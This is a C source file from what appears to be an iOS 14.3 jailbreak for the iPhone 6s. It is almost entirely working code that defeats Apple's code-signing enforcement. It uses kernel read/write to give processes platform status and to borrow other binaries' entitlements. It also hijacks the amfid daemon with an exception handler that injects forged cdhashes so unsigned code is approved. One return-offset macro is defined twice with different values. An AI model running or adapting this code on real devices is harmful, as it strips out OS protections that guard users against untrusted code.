//
//  amfi.c
//  LiRa jailbreak
//
//  Created by HoaHuynh on 2021/02/12.
//

#include "amfi.h"
#include "k_utils.h"
#include "kapi.h"
#include "k_offsets.h"
#include "utils.h"
#include "cs_blob.h"
#include <spawn.h>
#include <signal.h>
#include <unistd.h>
#include <mach/mach_traps.h>
#include <mach/mach.h>
#include <pthread/pthread.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/fcntl.h>
#include <mach-o/nlist.h>
#include <mach-o/getsect.h>
#include <mach-o/fat.h>
#include <stdbool.h>
#include <CommonCrypto/CommonCrypto.h>
#include <Foundation/Foundation.h>

#define CS_CDHASH_LEN 20
#define I6S_14_3_AMFID_RET 0x35C8
#define I6S_14_3_AMFID_RET 0x4C0B

typedef struct {
    mach_msg_header_t Head;
    mach_msg_body_t msgh_body;
    mach_msg_port_descriptor_t thread;
    mach_msg_port_descriptor_t task;
    NDR_record_t NDR;
} exception_raise_request; // Những bits chúng ta cần ít nhất

typedef struct {
  mach_msg_header_t Head;
  NDR_record_t NDR;
  kern_return_t RetCode;
} exception_raise_reply;

pthread_t exceptionThread;
static uint64_t origAMFID_MISVSACI = 0;
extern char**environ;
static pid_t sysdiagnose_pid = 0;
static bool has_entitlements = false;
static bool has_entitlements_rootfs = false;
static pid_t fsck_apfs_pid = 0;
static uint64_t selfEnts = 0;
static uint64_t sysdiagnoseEnts = 0;
static mach_port_t amfid_task_port = MACH_PORT_NULL;
static mach_port_t exceptionPort = MACH_PORT_NULL;
static uint64_t fsckapfsEnts = 0;
static uint64_t patchAddr = 0;

uint32_t swap_uint32( uint32_t val ) {
    val = ((val << 8) & 0xFF00FF00 ) | ((val >> 8) & 0xFF00FF );
    return (val << 16) | (val >> 16);
}

uint32_t read_magic(FILE* file, off_t offset) {
    uint32_t magic;
    fseek(file, offset, SEEK_SET);
    fread(&magic, sizeof(uint32_t), 1, file);
    return magic;
}

void *load_bytes(FILE *file, off_t offset, size_t size) {
    void *buf = calloc(1, size);
    fseek(file, offset, SEEK_SET);
    fread(buf, size, 1, file);
    return buf;
}


uint8_t *getCodeDirectory(const char* name) {
    
    FILE* fd = fopen(name, "r");
    
    uint32_t magic;
    fread(&magic, sizeof(magic), 1, fd);
    fseek(fd, 0, SEEK_SET);
    
    long off = 0, file_off = 0;
    int ncmds = 0;
    bool foundarm64 = false;
    
    if (magic == MH_MAGIC_64) { // 0xFEEDFACF
        struct mach_header_64 mh64;
        fread(&mh64, sizeof(mh64), 1, fd);
        off = sizeof(mh64);
        ncmds = mh64.ncmds;
    }
    else if (magic == MH_MAGIC) {
        printf("[-] %s is 32bit. What are you doing here?\n", name);
        fclose(fd);
        return NULL;
    }
    else if (magic == 0xBEBAFECA) { //Phép thuật nhị phân FAT
        
        size_t header_size = sizeof(struct fat_header);
        size_t arch_size = sizeof(struct fat_arch);
        size_t arch_off = header_size;
        
        struct fat_header *fat = (struct fat_header*)load_bytes(fd, 0, header_size);
        struct fat_arch *arch = (struct fat_arch *)load_bytes(fd, arch_off, arch_size);
        
        int n = swap_uint32(fat->nfat_arch);
        printf("[*] Binary is FAT with %d architectures\n", n);
        
        while (n-- > 0) {
            magic = read_magic(fd, swap_uint32(arch->offset));
            
            if (magic == 0xFEEDFACF) {
                printf("[*] Found arm64\n");
                foundarm64 = true;
                struct mach_header_64* mh64 = (struct mach_header_64*)load_bytes(fd, swap_uint32(arch->offset), sizeof(struct mach_header_64));
                file_off = swap_uint32(arch->offset);
                off = swap_uint32(arch->offset) + sizeof(struct mach_header_64);
                ncmds = mh64->ncmds;
                break;
            }
            
            arch_off += arch_size;
            arch = load_bytes(fd, arch_off, arch_size);
        }
        
        if (!foundarm64) {
            printf("[-] No arm64? RIP\n");
            fclose(fd);
            return NULL;
        }
    }
    else {
        printf("[-] %s is not a macho! (or has foreign endianness?) (magic: %x)\n", name, magic);
        fclose(fd);
        return NULL;
    }
    
    for (int i = 0; i < ncmds; i++) {
        struct load_command cmd;
        fseek(fd, off, SEEK_SET);
        fread(&cmd, sizeof(struct load_command), 1, fd);
        if (cmd.cmd == LC_CODE_SIGNATURE) {
            uint32_t off_cs;
            fread(&off_cs, sizeof(uint32_t), 1, fd);
            uint32_t size_cs;
            fread(&size_cs, sizeof(uint32_t), 1, fd);
            
            uint8_t *cd = malloc(size_cs);
            fseek(fd, off_cs + file_off, SEEK_SET);
            fread(cd, size_cs, 1, fd);
            fclose(fd);
            return cd;
        } else {
            off += cmd.cmdsize;
        }
    }
    fclose(fd);
    return NULL;
}

static unsigned int hash_rank(const CodeDirectory *cd)
{
    uint32_t type = cd->hashType;
    unsigned int n;
    
    for (n = 0; n < sizeof(hashPriorities) / sizeof(hashPriorities[0]); ++n)
        if (hashPriorities[n] == type)
            return n + 1;
    return 0;    /* Không hộ trợ */
}

int get_hash(const CodeDirectory* directory, uint8_t dst[CS_CDHASH_LEN]) {
    uint32_t realsize = ntohl(directory->length);
    
    if (ntohl(directory->magic) != CSMAGIC_CODEDIRECTORY) {
        util_error("[get_hash] wtf, not CSMAGIC_CODEDIRECTORY?!");
        return 1;
    }
    
    uint8_t out[CS_HASH_MAX_SIZE];
    uint8_t hash_type = directory->hashType;
    
    switch (hash_type) {
        case CS_HASHTYPE_SHA1:
            CC_SHA1(directory, realsize, out);
            break;
            
        case CS_HASHTYPE_SHA256:
        case CS_HASHTYPE_SHA256_TRUNCATED:
            CC_SHA256(directory, realsize, out);
            break;
            
        case CS_HASHTYPE_SHA384:
            CC_SHA384(directory, realsize, out);
            break;
            
        default:
            util_error("[get_hash] Unknown hash type: 0x%x", hash_type);
            return 2;
    }
    
    memcpy(dst, out, CS_CDHASH_LEN);
    return 0;
}

int parse_superblob(uint8_t *code_dir, uint8_t dst[CS_CDHASH_LEN]) {
    int ret = 1;
    const CS_SuperBlob *sb = (const CS_SuperBlob *)code_dir;
    uint8_t highest_cd_hash_rank = 0;
    
    for (int n = 0; n < ntohl(sb->count); n++){
        const CS_BlobIndex *blobIndex = &sb->index[n];
        uint32_t type = ntohl(blobIndex->type);
        uint32_t offset = ntohl(blobIndex->offset);
        if (ntohl(sb->length) < offset) {
            util_error("offset of blob #%d overflows superblob length", n);
            return 1;
        }
        
        const CodeDirectory *subBlob = (const CodeDirectory *)(code_dir + offset);
        // size_t subLength = ntohl(subBlob->length);
        
        if (type == CSSLOT_CODEDIRECTORY || (type >= CSSLOT_ALTERNATE_CODEDIRECTORIES && type < CSSLOT_ALTERNATE_CODEDIRECTORY_LIMIT)) {
            uint8_t rank = hash_rank(subBlob);
            
            if (rank > highest_cd_hash_rank) {
                ret = get_hash(subBlob, dst);
                highest_cd_hash_rank = rank;
            }
        }
    }
    
    return ret;
}

void platformize(pid_t pid) {
    
    if (!pid) return;
    
    uint64_t proc = kproc_find_by_pid(pid);
    uint64_t task = kapi_read64(proc + OFFSET(proc, task));
    
    uint32_t t_flags = kapi_read32(task + OFFSET(task, t_flags));
    kapi_write32(task+OFFSET(task, t_flags), t_flags | TF_PLATFORM);
    
    uint32_t csflags = kapi_read32(proc + OFFSET(proc, p_csflags));
    csflags = csflags | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW;
    csflags &= ~(CS_RESTRICT | CS_HARD | CS_KILL);
    kapi_write32(proc + OFFSET(proc, p_csflags), csflags);
}

bool grabEntitlements(uint64_t selfProc) {
    if(has_entitlements)
        return false;
    
    posix_spawnattr_t attrp;
    posix_spawnattr_init(&attrp);
    posix_spawnattr_setflags(&attrp, POSIX_SPAWN_START_SUSPENDED);
    
    pid_t pid;
    const char *argv[] = {"spindump", NULL};
    int retVal = posix_spawn(&pid, "/usr/sbin/spindump", NULL, &attrp, (char* const*)argv, environ);
    if(retVal < 0)
        return false;
    sysdiagnose_pid = pid;
    
    uint64_t sysdiagnose_proc = kproc_find_by_pid(pid);
    if(!sysdiagnose_proc)
        return false;
    
    uint64_t selfCreds = kapi_read64(selfProc + OFFSET(proc, p_ucred));
    uint64_t sysdiagnoseCreds = kapi_read64(sysdiagnose_proc + OFFSET(proc, p_ucred));
    
    selfEnts = kapi_read64(kapi_read64(selfCreds + OFFSET(ucred, cr_label)) + OFFSET(amfi, slot_off));
    sysdiagnoseEnts = kapi_read64(kapi_read64(sysdiagnoseCreds + OFFSET(ucred, cr_label)) + OFFSET(amfi, slot_off));
    
    kapi_write64(kapi_read64(selfCreds + OFFSET(ucred, cr_label)) + OFFSET(amfi, slot_off), sysdiagnoseEnts);
    
    has_entitlements = true;
    return true;
}

void resetEntitlements(uint64_t selfProc) {
    if(!has_entitlements)
        return;
    
    has_entitlements = false;
    uint64_t selfCreds = kapi_read64(selfProc + OFFSET(proc, p_ucred));
    kapi_write64(kapi_read64(selfCreds + OFFSET(ucred, cr_label)) + OFFSET(amfi, slot_off), selfEnts);
    kill(sysdiagnose_pid, SIGKILL);
}

static size_t amfid_fsize = 0;
uint8_t* map_file_to_mem(const char* path){
    struct stat fstat = {0};
    stat(path, &fstat);
    amfid_fsize = fstat.st_size;
    
    int fd = open(path, O_RDONLY);
    uint8_t *mapping_mem = mmap(NULL, mach_vm_round_page(amfid_fsize), PROT_READ, MAP_SHARED, fd, 0);
    if((int)mapping_mem == -1){
        util_error("Error in map_file_to_mem(): mmap() == -1\n");
        return 0;
    }
    return mapping_mem;
}

void* amfidRead(uint64_t addr, uint64_t len) {
    kern_return_t ret;
    vm_offset_t buf = 0;
    mach_msg_type_number_t num = 0;
    ret = mach_vm_read(amfid_task_port, addr, len, &buf, &num);
    if (ret != KERN_SUCCESS) {
        util_error("[-] amfid read failed (0x%llx)\n", addr);
        return NULL;
    }
    uint8_t* outbuf = malloc(len);
    memcpy(outbuf, (void*)buf, len);
    mach_vm_deallocate(mach_task_self(), buf, num);
    return outbuf;
}


void amfidWrite32(uint64_t addr, uint32_t data) {
    kern_return_t err = mach_vm_write(amfid_task_port, addr, (vm_offset_t)&data, (mach_msg_type_number_t)sizeof(uint32_t));
    if (err != KERN_SUCCESS) {
        util_error("Failed amfidWrite32: %s", mach_error_string(err));
    }
}

void amfidWrite64(uint64_t addr, uint64_t data) {
    kern_return_t err = mach_vm_write(amfid_task_port, addr, (vm_offset_t)&data, (mach_msg_type_number_t)sizeof(uint64_t));
    if(err != KERN_SUCCESS) {
        util_error("Failed amfidWrite64: %s", mach_error_string(err));
    }
}

void takeoverAmfid(int amfidPid) {
    if(!has_entitlements)
        return;
    
    kern_return_t retVal = task_for_pid(mach_task_self(), amfidPid, &amfid_task_port);
    if(retVal != 0) {
        util_error("Unable to get amfid task: %s", mach_error_string(retVal));
        return;
    }
    util_info("Cổng dịch vụ amfid: 0x%x", amfid_task_port);
    
    uint64_t loadAddress = loadAddr(amfid_task_port);
    util_info("Địa chỉ amfid: 0x%llx", loadAddress);
    
    retVal = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &exceptionPort);
    if(retVal != KERN_SUCCESS) {
        util_error("Failed mach_port_allocate: %s", mach_error_string(retVal));
        return;
    }
    
    retVal = mach_port_insert_right(mach_task_self(), exceptionPort, exceptionPort, MACH_MSG_TYPE_MAKE_SEND);
    if(retVal != KERN_SUCCESS) {
        util_error("Failed mach_port_insert_right: %s", mach_error_string(retVal));
        return;
    }
    
    retVal = task_set_exception_ports(amfid_task_port, EXC_MASK_BAD_ACCESS, exceptionPort, EXCEPTION_DEFAULT, ARM_THREAD_STATE64);
    if(retVal != KERN_SUCCESS) {
        util_error("Failed task_set_exception_ports: %s", mach_error_string(retVal));
        return;
    }
    pthread_create(&exceptionThread, NULL, AMFIDExceptionHandler, NULL);
    
    uint8_t *amfid_fdata = map_file_to_mem("/usr/libexec/amfid");
    uint64_t patchOffset = find_amfid_OFFSET_MISValidate_symbol(amfid_fdata);
    util_info("_MISValidateSignatureAndCopyInfo offset: 0x%llx", patchOffset);
    munmap(amfid_fdata, amfid_fsize);
    
    mach_vm_size_t sz;
    retVal = mach_vm_read_overwrite(amfid_task_port, loadAddress+patchOffset, sizeof(uint64_t), (mach_vm_address_t)&origAMFID_MISVSACI, &sz);
    
    if (retVal != KERN_SUCCESS) {
        util_error("[amfid][-] Error reading MISVSACI: %s\n", mach_error_string(retVal));
        return;
    }
    util_info("MISVSACI nguyên thuỷ: 0x%llx\n", origAMFID_MISVSACI);
    
    //  Làm cho amfi sụp đổ
    retVal = vm_protect(amfid_task_port, mach_vm_trunc_page(loadAddress + patchOffset), vm_page_size, false, VM_PROT_READ | VM_PROT_WRITE);
    if(retVal != KERN_SUCCESS) {
        util_error("Failed vm_protect: %s", mach_error_string(retVal));
    }
    
    patchAddr = loadAddress + patchOffset;
    amfidWrite64(patchAddr, 0x12345);
}

uint64_t loadAddr(mach_port_t port) {
    mach_msg_type_number_t region_count = VM_REGION_BASIC_INFO_COUNT_64;
    memory_object_name_t object_name = MACH_PORT_NULL;
    
    mach_vm_address_t first_addr = 0;
    mach_vm_size_t first_size = 0x1000;
    
    struct vm_region_basic_info_64 region = {0};
    
    kern_return_t err = mach_vm_region(port, &first_addr, &first_size, VM_REGION_BASIC_INFO_64, (vm_region_info_t)&region, &region_count, &object_name);
    if (err != KERN_SUCCESS) {
        util_error("failed to get the region: %s", mach_error_string(err));
        return 0;
    }
    
    return first_addr;
}

uint64_t find_amfid_OFFSET_MISValidate_symbol(uint8_t* amfid_macho) {
    uint32_t MISValidate_symIndex = 0;
    struct mach_header_64 *mh = (struct mach_header_64*)amfid_macho;
    const uint32_t cmd_count = mh->ncmds;
    struct load_command *cmds = (struct load_command*)(mh + 1);
    struct load_command* cmd = cmds;
    for (uint32_t i = 0; i < cmd_count; ++i){
        switch (cmd->cmd) {
            case LC_SYMTAB:{
                struct symtab_command *sym_cmd = (struct symtab_command*)cmd;
                uint32_t symoff = sym_cmd->symoff;
                uint32_t nsyms = sym_cmd->nsyms;
                uint32_t stroff = sym_cmd->stroff;
                
                for(int i =0;i<nsyms;i++){
                    struct nlist_64 *nn = (void*)((char*)mh+symoff+i*sizeof(struct nlist_64));
                    char *def_str = NULL;
                    if(nn->n_type==0x1){
                        def_str = (char*)mh+(uint32_t)nn->n_un.n_strx + stroff;
                        if(!strcmp(def_str, "_MISValidateSignatureAndCopyInfo")){
                            break;
                        }
                    }
                    if(i!=0 && i!=1){
                        MISValidate_symIndex++;
                    }
                }
            }
                break;
        }
        cmd = (struct load_command*)((char*)cmd + cmd->cmdsize);
    }
    
    if(MISValidate_symIndex == 0){
        util_error("Error in find_amfid_OFFSET_MISValidate_symbol(): MISValidate_symIndex == 0\n");
        return 0;
    }
    
    const struct section_64 *sect_info = NULL;
    const char *_segment = "__DATA", *_section = "__la_symbol_ptr";
    sect_info = getsectbynamefromheader_64((const struct mach_header_64 *)amfid_macho, _segment, _section);
    
    if(!sect_info){
        util_error("Error in find_amfid_OFFSET_MISValidate_symbol(): if(!sect_info)\n");
        return 0;
    }
    
    return sect_info->offset + (MISValidate_symIndex * 0x8);
}

void* AMFIDExceptionHandler(void* arg) {

    uint32_t size = 0x1000;
    mach_msg_header_t* msg = malloc(size);
    
    for(;;) {
        kern_return_t ret;
        printf("[amfid][*] Calling mach_msg to receive exception message from amfid\n");
        ret = mach_msg(msg, MACH_RCV_MSG | MACH_MSG_TIMEOUT_NONE, 0, size, exceptionPort, 0, 0);
        
        if (ret != KERN_SUCCESS){
            printf("[amfid][-] Error receiving exception port: %s\n", mach_error_string(ret));
            continue;
        } else {
            printf("[amfid][+] Got called!\n");
            exception_raise_request* req = (exception_raise_request*)msg;
            
            mach_port_t thread_port = req->thread.name;
            mach_port_t task_port = req->task.name;
            
            
            _STRUCT_ARM_THREAD_STATE64 old_state = {0};
            mach_msg_type_number_t old_stateCnt = sizeof(old_state)/4;
            
            ret = thread_get_state(thread_port, ARM_THREAD_STATE64, (thread_state_t)&old_state, &old_stateCnt);
            if (ret != KERN_SUCCESS){
                printf("[amfid][-] Error getting thread state: %s\n", mach_error_string(ret));
                continue;
            }
            
            printf("[amfid][+] Got thread state!\n");
            
            
            _STRUCT_ARM_THREAD_STATE64 new_state;
            memcpy(&new_state, &old_state, sizeof(_STRUCT_ARM_THREAD_STATE64));
            
            /* Lấy tên tệp được trỏ tới bởi X22
__text:0000000100003358                 ADR             X1, aEnteringIosPat ; "Entering iOS path for %s"
__text:000000010000335C                 NOP
__text:0000000100003360                 MOV             W0, #6  ; int
__text:0000000100003364                 BL              _syslog
__text:0000000100003368                 NOP
__text:000000010000336C                 LDR             X8, =_kCFAllocatorDefault
__text:0000000100003370                 LDR             X24, [X8]
__text:0000000100003374                 MOV             X0, X24
__text:0000000100003378                 MOV             X1, X22 <- this
__text:000000010000337C                 BL              _CFStringCreateWithFileSystemRepresentation
*/
            char* filename = (char*)amfidRead(new_state.__x[22], 1024);
            
            if(!filename) {
                printf("[amfid][-] No file name?");
                continue;
            }
            
            uint8_t *orig_cdhash = (uint8_t*)amfidRead(new_state.__x[23], CS_CDHASH_LEN);
            
            printf("[amfid][+] Got request for: %s\n", filename);
            printf("[amfid][*] Original cdhash: \n\t");
            for (int i = 0; i < CS_CDHASH_LEN; i++) {
                printf("%02x ", orig_cdhash[i]);
            }
            printf("\n");
            
            if (strlen((char*)orig_cdhash)) {
                printf("[amfid][*] Jumping thread to 0x%llx\n", origAMFID_MISVSACI);
                new_state.__pc = origAMFID_MISVSACI;
            } else {
                uint8_t* code_directory = getCodeDirectory(filename);
                if (!code_directory) {
                    printf("[amfid][-] Can't get code directory\n");
                    goto end;
                }
                uint8_t cd_hash[CS_CDHASH_LEN];
                if (parse_superblob(code_directory, cd_hash)) {
                    printf("[amfid][-] parse_superblob failed\n");
                    goto end;
                }
                
                printf("[amfid][*] New cdhash: \n\t");
                for (int i = 0; i < CS_CDHASH_LEN; i++) {
                    printf("%02x ", cd_hash[i]);
                }
                printf("\n");
                
                new_state.__pc = origAMFID_MISVSACI;
                
                ret = mach_vm_write(task_port, old_state.__x[23], (vm_offset_t)&cd_hash, 20);
                if (ret == KERN_SUCCESS)
                {
                    printf("[amfid][+] Wrote the cdhash into amfid\n");
                } else {
                    printf("[amfid][-] Unable to write the cdhash into amfid!\n");
                }
                
                amfidWrite32(old_state.__x[26], 1);
                new_state.__pc = loadAddr(task_port) + I6S_14_3_AMFID_RET;//(old_state.__lr & 0xfffffffffffff000) + 0x1000; // 0x2dacwhere
                
                printf("[amfid][i] Old PC: 0x%llx, new PC: 0x%llx\n", old_state.__pc, new_state.__pc);
            }
            
            ret = thread_set_state(thread_port, 6, (thread_state_t)&new_state, sizeof(new_state)/4);
            if (ret != KERN_SUCCESS) {
                printf("[amfid][-] Failed to set new thread state %s\n", mach_error_string(ret));
            } else {
                printf("[amfid][+] Success setting new state for amfid!\n");
            }
            
            exception_raise_reply reply = {0};
            
            reply.Head.msgh_bits = MACH_MSGH_BITS(MACH_MSGH_BITS_REMOTE(req->Head.msgh_bits), 0);
            reply.Head.msgh_size = sizeof(reply);
            reply.Head.msgh_remote_port = req->Head.msgh_remote_port;
            reply.Head.msgh_local_port = MACH_PORT_NULL;
            reply.Head.msgh_id = req->Head.msgh_id + 0x64;
            
            reply.NDR = req->NDR;
            reply.RetCode = KERN_SUCCESS;
            ret = mach_msg(&reply.Head,
                           1,
                           (mach_msg_size_t)sizeof(reply),
                           0,
                           MACH_PORT_NULL,
                           MACH_MSG_TIMEOUT_NONE,
                           MACH_PORT_NULL);
            
            mach_port_deallocate(mach_task_self(), thread_port);
            mach_port_deallocate(mach_task_self(), task_port);
            if (ret != KERN_SUCCESS){
                printf("[amfid][-] Failed to send the reply to the exception message %s\n", mach_error_string(ret));
            } else{
                printf("[amfid][+] Replied to the amfid exception...\n");
            }
            
        if(strcmp(filename, "/LiRa/amfid_bypassd") == 0) {
            printf("Found amfidebilitate, no longer need to run this function.");
            amfidWrite64(patchAddr, origAMFID_MISVSACI);
            free(filename);
            free(orig_cdhash);
            resetEntitlements(kproc_find_by_pid(getpid()));
            break;
        }
            
        end:;
            free(filename);
            free(orig_cdhash);
        }
    }
    return NULL;
}

bool grabEntitlementsForRootFS(uint64_t selfProc) {
    if(has_entitlements_rootfs)
        return false;
    
    pid_t pid;
    const char *argv[] = {"rootfs", NULL};
    int retVal = posix_spawn(&pid, "/tmp/rootfs", NULL, NULL, (char* const*)argv, environ);
    util_info("rootfs - posix_spawn ret: %d", retVal);
    if(retVal < 0)
        return false;
    
    usleep(100);
    kill(pid, SIGSTOP);
    platformize(pid);
    fsck_apfs_pid = pid;
    
    uint64_t fsck_apfs_proc = kproc_find_by_pid(pid);
    if(!fsck_apfs_proc)
        return false;
    
    uint64_t selfCreds = kapi_read64(selfProc + OFFSET(proc, p_ucred));
    uint64_t fsckapfsCreds = kapi_read64(fsck_apfs_proc + OFFSET(proc, p_ucred));
    
    selfEnts = kapi_read64(kapi_read64(selfCreds + OFFSET(ucred, cr_label)) + OFFSET(amfi, slot_off));
    fsckapfsEnts = kapi_read64(kapi_read64(fsckapfsCreds + OFFSET(ucred, cr_label)) + OFFSET(amfi, slot_off));
    
    kapi_write64(kapi_read64(selfCreds + OFFSET(ucred, cr_label)) + OFFSET(amfi, slot_off), fsckapfsEnts);
    
    has_entitlements_rootfs = true;
    return true;
}

void resetEntitlementsForRootFS(uint64_t selfProc) {
    if(!has_entitlements_rootfs)
        return;
    
    has_entitlements_rootfs = false;
    uint64_t selfCreds = kapi_read64(selfProc + OFFSET(proc, p_ucred));
    
    kapi_write64(kapi_read64(selfCreds + OFFSET(ucred, cr_label)) + OFFSET(amfi, slot_off), selfEnts);
    kill(fsck_apfs_pid, SIGKILL);
}
